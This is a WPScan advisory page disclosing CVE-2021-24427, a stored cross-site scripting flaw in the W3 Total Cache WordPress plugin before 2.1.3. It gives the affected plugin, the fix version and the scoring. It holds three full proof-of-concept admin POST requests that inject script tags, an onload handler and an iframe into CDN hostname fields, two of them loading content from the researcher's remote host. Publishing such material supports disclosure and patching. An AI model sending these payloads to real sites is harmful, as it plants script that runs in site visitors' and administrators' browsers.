=== Content from wpscan.com_885db714_20250115_090118.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# W3 Total Cache < 2.1.3 - Authenticated Stored XSS

### Description

The plugin did not sanitise or escape some of its CDN settings, allowing high privilege users to use JavaScript in them, which will be output in the page, leading to an authenticated Stored Cross-Site Scripting issue

### Proof of Concept

Vulnerable parameter(s): &cdn\_cnames[]= (#1), cdn\_cnames[]= (#2), cdn\_cnames[]= (#3).
CDN Type: Akamai, Amazon CloudFront, AT&T, Cotendo, Generic Mirror, Verizon Digital Media Services (EdgeCast), Amazon CloudFront Over S3, Amazon Simple Storage Service (S3), Amazon Simple Storage Service (S3) Compatible, Microsoft Azure Storage, Self-hosted.
PoC #1 | Authenticated Persistent XSS | CDN > Replace site's hostname with (reserved for CSS):
POST /wp-admin/admin.php?page=w3tc\_cdn HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 2204
cdn\_\_uploads\_\_enable=0&cdn\_\_uploads\_\_enable=1&cdn\_\_includes\_\_enable=0&cdn\_\_includes\_\_enable=1&cdn\_\_theme\_\_enable=0&cdn\_\_theme\_\_enable=1&cdn\_\_custom\_\_enable=0&cdn\_\_custom\_\_enable=1&cdn\_\_force\_\_rewrite=0&cdn\_\_canonical\_header=0&\_wpnonce=5f67f11949&\_wp\_http\_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dw3tc\_cdn%26w3tc\_message%3D60a54a0bbb254&cdn\_\_ftp\_\_pasv=0&cdn\_\_ftp\_\_host=&cdn\_\_ftp\_\_type=&cdn\_\_ftp\_\_user=&cdn\_\_ftp\_\_pass=&cdn\_\_ftp\_\_path=&cdn\_\_ftp\_\_ssl=auto&cdn\_cnames%5B%5D=%23%27%22%3E%3Cscript%3Ealert%28%29%3B%3C%2Fscript%3E%3Cdiv+x&cdn\_cnames%5B%5D=&cdn\_cnames%5B%5D=&cdn\_cnames%5B%5D=&\_wpnonce=5f67f11949&\_wp\_http\_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dw3tc\_cdn%26w3tc\_message%3D60a54a0bbb254&w3tc\_default\_save\_and\_flush=Save+Settings+%26+Purge+Caches&cdn\_\_flush\_manually=0&cdn\_\_reject\_\_ssl=0&cdn\_\_admin\_\_media\_library=0&cdn\_\_cors\_header=0&cdn\_\_cors\_header=1&cdn\_\_reject\_\_logged\_roles=0&cdn\_\_reject\_\_roles=&cdn\_\_reject\_\_uri=&cdn\_\_autoupload\_\_enabled=0&cdn\_\_autoupload\_\_interval=3600&cdn\_\_queue\_\_interval=900&cdn\_\_queue\_\_limit=25&cdn\_\_includes\_\_files=\*.css%3B\*.js%3B\*.gif%3B\*.png%3B\*.jpg%3B\*.xml&cdn\_\_theme\_\_files=\*.css%3B\*.js%3B\*.gif%3B\*.png%3B\*.jpg%3B\*.ico%3B\*.ttf%3B\*.otf%3B\*.woff%3B\*.woff2%3B\*.less&cdn\_\_import\_\_files=&cdn\_\_custom\_\_files=favicon.ico%0D%0A%7Bwp\_content\_dir%7D%2Fgallery%2F\*%0D%0A%7Bwp\_content\_dir%7D%2Fuploads%2Favatars%2F\*%0D%0A%7Bplugins\_dir%7D%2Fwordpress-seo%2Fcss%2Fxml-sitemap.xsl%0D%0A%7Bplugins\_dir%7D%2Fwp-minify%2Fmin\*%0D%0A%7Bplugins\_dir%7D%2F\*.js%0D%0A%7Bplugins\_dir%7D%2F\*.css%0D%0A%7Bplugins\_dir%7D%2F\*.gif%0D%0A%7Bplugins\_dir%7D%2F\*.jpg%0D%0A%7Bplugins\_dir%7D%2F\*.png&cdn\_\_reject\_\_ua=&cdn\_\_reject\_\_files=%7Buploads\_dir%7D%2Fwpcf7\_captcha%2F\*%0D%0A%7Buploads\_dir%7D%2Fimagerotator.swf%0D%0A%7Bplugins\_dir%7D%2Fwp-fb-autoconnect%2Ffacebook-platform%2Fchannel.html&set\_cookie\_domain\_old=0&set\_cookie\_domain\_new=0&\_wpnonce=5f67f11949&\_wp\_http\_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dw3tc\_cdn%26w3tc\_message%3D60a54a0bbb254
PoC #2 | Authenticated Persistent XSS | CDN > Replace site's hostname with (reserved for JS in <head>):
POST /wp-admin/admin.php?page=w3tc\_cdn HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 2204
cdn\_\_uploads\_\_enable=0&cdn\_\_uploads\_\_enable=1&cdn\_\_includes\_\_enable=0&cdn\_\_includes\_\_enable=1&cdn\_\_theme\_\_enable=0&cdn\_\_theme\_\_enable=1&cdn\_\_custom\_\_enable=0&cdn\_\_custom\_\_enable=1&cdn\_\_force\_\_rewrite=0&cdn\_\_canonical\_header=0&\_wpnonce=5f67f11949&\_wp\_http\_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dw3tc\_cdn%26w3tc\_message%3D60a54d06077f1&cdn\_\_ftp\_\_pasv=0&cdn\_\_ftp\_\_host=&cdn\_\_ftp\_\_type=&cdn\_\_ftp\_\_user=&cdn\_\_ftp\_\_pass=&cdn\_\_ftp\_\_path=&cdn\_\_ftp\_\_ssl=auto&cdn\_cnames%5B%5D=1&cdn\_cnames%5B%5D=m0ze.ru%2Fpayload%2Fa.js%27+onload%3D%27alert%2813%29%3B%27+stuff%3D%27&cdn\_cnames%5B%5D=&\_wpnonce=5f67f11949&\_wp\_http\_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dw3tc\_cdn%26w3tc\_message%3D60a54d06077f1&w3tc\_default\_save\_and\_flush=Save+Settings+%26+Purge+Caches&cdn\_\_flush\_manually=0&cdn\_\_reject\_\_ssl=0&cdn\_\_admin\_\_media\_library=0&cdn\_\_cors\_header=0&cdn\_\_cors\_header=1&cdn\_\_reject\_\_logged\_roles=0&cdn\_\_reject\_\_roles=&cdn\_\_reject\_\_uri=&cdn\_\_autoupload\_\_enabled=0&cdn\_\_autoupload\_\_interval=3600&cdn\_\_queue\_\_interval=900&cdn\_\_queue\_\_limit=25&cdn\_\_includes\_\_files=\*.css%3B\*.js%3B\*.gif%3B\*.png%3B\*.jpg%3B\*.xml&cdn\_\_theme\_\_files=\*.css%3B\*.js%3B\*.gif%3B\*.png%3B\*.jpg%3B\*.ico%3B\*.ttf%3B\*.otf%3B\*.woff%3B\*.woff2%3B\*.less&cdn\_\_import\_\_files=&cdn\_\_custom\_\_files=favicon.ico%0D%0A%7Bwp\_content\_dir%7D%2Fgallery%2F\*%0D%0A%7Bwp\_content\_dir%7D%2Fuploads%2Favatars%2F\*%0D%0A%7Bplugins\_dir%7D%2Fwordpress-seo%2Fcss%2Fxml-sitemap.xsl%0D%0A%7Bplugins\_dir%7D%2Fwp-minify%2Fmin\*%0D%0A%7Bplugins\_dir%7D%2F\*.js%0D%0A%7Bplugins\_dir%7D%2F\*.css%0D%0A%7Bplugins\_dir%7D%2F\*.gif%0D%0A%7Bplugins\_dir%7D%2F\*.jpg%0D%0A%7Bplugins\_dir%7D%2F\*.png&cdn\_\_reject\_\_ua=&cdn\_\_reject\_\_files=%7Buploads\_dir%7D%2Fwpcf7\_captcha%2F\*%0D%0A%7Buploads\_dir%7D%2Fimagerotator.swf%0D%0A%7Bplugins\_dir%7D%2Fwp-fb-autoconnect%2Ffacebook-platform%2Fchannel.html&set\_cookie\_domain\_old=0&set\_cookie\_domain\_new=0&\_wpnonce=5f67f11949&\_wp\_http\_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dw3tc\_cdn%26w3tc\_message%3D60a54d06077f1
PoC #3 | Authenticated Persistent XSS | CDN > Replace site's hostname with (reserved for JS after <body>):
POST /wp-admin/admin.php?page=w3tc\_cdn HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 2204
cdn\_\_uploads\_\_enable=0&cdn\_\_uploads\_\_enable=1&cdn\_\_includes\_\_enable=0&cdn\_\_includes\_\_enable=1&cdn\_\_theme\_\_enable=0&cdn\_\_theme\_\_enable=1&cdn\_\_custom\_\_enable=0&cdn\_\_custom\_\_enable=1&cdn\_\_force\_\_rewrite=0&cdn\_\_canonical\_header=0&\_wpnonce=5f67f11949&\_wp\_http\_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dw3tc\_cdn%26w3tc\_message%3D60a54cf6ef099&cdn\_\_ftp\_\_pasv=0&cdn\_\_ftp\_\_host=&cdn\_\_ftp\_\_type=&cdn\_\_ftp\_\_user=&cdn\_\_ftp\_\_pass=&cdn\_\_ftp\_\_path=&cdn\_\_ftp\_\_ssl=auto&cdn\_cnames%5B%5D=1&cdn\_cnames%5B%5D=2&cdn\_cnames%5B%5D=%23%27%22%3E%3Ciframe+src%3Dhttps%3A%2F%2Fm0ze.ru%2Fpayload%2Fxfsii.html%3E%3C%2Fiframe%3E%3Cdiv+x&\_wpnonce=5f67f11949&\_wp\_http\_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dw3tc\_cdn%26w3tc\_message%3D60a54cf6ef099&w3tc\_default\_save\_and\_flush=Save+Settings+%26+Purge+Caches&cdn\_\_flush\_manually=0&cdn\_\_reject\_\_ssl=0&cdn\_\_admin\_\_media\_library=0&cdn\_\_cors\_header=0&cdn\_\_cors\_header=1&cdn\_\_reject\_\_logged\_roles=0&cdn\_\_reject\_\_roles=&cdn\_\_reject\_\_uri=&cdn\_\_autoupload\_\_enabled=0&cdn\_\_autoupload\_\_interval=3600&cdn\_\_queue\_\_interval=900&cdn\_\_queue\_\_limit=25&cdn\_\_includes\_\_files=\*.css%3B\*.js%3B\*.gif%3B\*.png%3B\*.jpg%3B\*.xml&cdn\_\_theme\_\_files=\*.css%3B\*.js%3B\*.gif%3B\*.png%3B\*.jpg%3B\*.ico%3B\*.ttf%3B\*.otf%3B\*.woff%3B\*.woff2%3B\*.less&cdn\_\_import\_\_files=&cdn\_\_custom\_\_files=favicon.ico%0D%0A%7Bwp\_content\_dir%7D%2Fgallery%2F\*%0D%0A%7Bwp\_content\_dir%7D%2Fuploads%2Favatars%2F\*%0D%0A%7Bplugins\_dir%7D%2Fwordpress-seo%2Fcss%2Fxml-sitemap.xsl%0D%0A%7Bplugins\_dir%7D%2Fwp-minify%2Fmin\*%0D%0A%7Bplugins\_dir%7D%2F\*.js%0D%0A%7Bplugins\_dir%7D%2F\*.css%0D%0A%7Bplugins\_dir%7D%2F\*.gif%0D%0A%7Bplugins\_dir%7D%2F\*.jpg%0D%0A%7Bplugins\_dir%7D%2F\*.png&cdn\_\_reject\_\_ua=&cdn\_\_reject\_\_files=%7Buploads\_dir%7D%2Fwpcf7\_captcha%2F\*%0D%0A%7Buploads\_dir%7D%2Fimagerotator.swf%0D%0A%7Bplugins\_dir%7D%2Fwp-fb-autoconnect%2Ffacebook-platform%2Fchannel.html&set\_cookie\_domain\_old=0&set\_cookie\_domain\_new=0&\_wpnonce=5f67f11949&\_wp\_http\_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dw3tc\_cdn%26w3tc\_message%3D60a54cf6ef099

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

w3-total-cache](https://a8cteam5105.wordpress.com/plugin/w3-total-cache/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 2.1.3

### References

CVE
[CVE-2021-24427](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24427)

URL
[https://m0ze.ru/vulnerability/[2021-04-25]-[WordPress]-[CWE-79]-W3-Total-Cache-WordPress-Plugin-v2.1.2.txt](https://m0ze.ru/vulnerability/%5B2021-04-25%5D-%5BWordPress%5D-%5BCWE-79%5D-W3-Total-Cache-WordPress-Plugin-v2.1.2.txt)

### Classification

Type
XSS

OWASP top 10
[A7: Cross-Site Scripting (XSS)](https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_%28XSS%29)

CWE
[CWE-79](https://cwe.mitre.org/data/definitions/79.html)

CVSS
[4.8 (medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N)

### Miscellaneous

Original Researcher
m0ze

Submitter
m0ze

Submitter website
<https://m0ze.ru>

Submitter twitter
[vladm0ze](//twitter.com/vladm0ze)

Verified
Yes

WPVDB ID
[5da5ce9a-82a6-404f-8dec-795d7905b3f9](https://a8cteam5105.wordpress.com/vulnerability/5da5ce9a-82a6-404f-8dec-795d7905b3f9/)

### Timeline

Publicly Published
2021-06-16 (about 3 years ago)

Added
2021-06-16 (about 3 years ago)

Last Updated
2021-06-25 (about 3 years ago)

### Other

Published
Title

Published
2014-08-01
Title
[Elegant Grunge 1.0.3 - s Parameter XSS](https://a8cteam5105.wordpress.com/vulnerability/6170aa20-c1a5-4113-af53-98c7288205a2/)

Published
2023-01-18
Title
[MainWP Code Snippets Extension < 4.0.3 - Subscriber+ Stored XSS](https://a8cteam5105.wordpress.com/vulnerability/89ef8450-9f3a-479e-9958-d1c89cdf02f1/)

Published
2021-10-25
Title
[Notification < 8.0.0 - Admin+ Stored Cross-Site Scripting](https://a8cteam5105.wordpress.com/vulnerability/44594bdf-b05c-4a7b-b9fb-e4bca832616a/)

Published
2024-05-14
Title
[FS Product Inquiry <= 1.1.1 - Reflected XSS](https://a8cteam5105.wordpress.com/vulnerability/6cf90a27-55e2-4b2c-9df1-5fa34c1bd9d1/)

Published
2024-08-01
Title
[Filter & Grids < 2.9.3 - Authenticated (Contributor+) Stored Cross-Site Scripting via Shortcode](https://a8cteam5105.wordpress.com/vulnerability/84c60332-054e-4037-b6b5-6d4502241003/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

